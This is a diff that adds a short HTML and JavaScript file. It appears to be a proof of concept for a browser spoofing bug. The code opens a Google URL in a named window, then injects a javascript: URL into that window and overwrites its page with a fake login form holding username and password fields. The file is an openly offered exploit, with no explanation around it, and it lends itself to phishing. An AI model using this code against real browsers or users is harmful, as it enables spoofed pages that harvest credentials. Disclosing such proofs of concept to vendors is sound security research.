@@ -1,0 +1,10 @@
+<a href="https://www.google.com/csi" target="ux" onclick="setTimeout('spoof()',200)"><h1>click here</h1></a>
+<script>
+function spoof() {
+var t = window.open('javascript:alert(document.domain)','ux');
+t.document.body.innerHTML = `<h1>This is not Facebook</h1>
+<input type="text" placeholder="Username" id="username"><br>
+<input type="password" placeholder="Password" id="password"><br>
+<button type="submit" action="#">Click me</button>`;
+}
+</script>
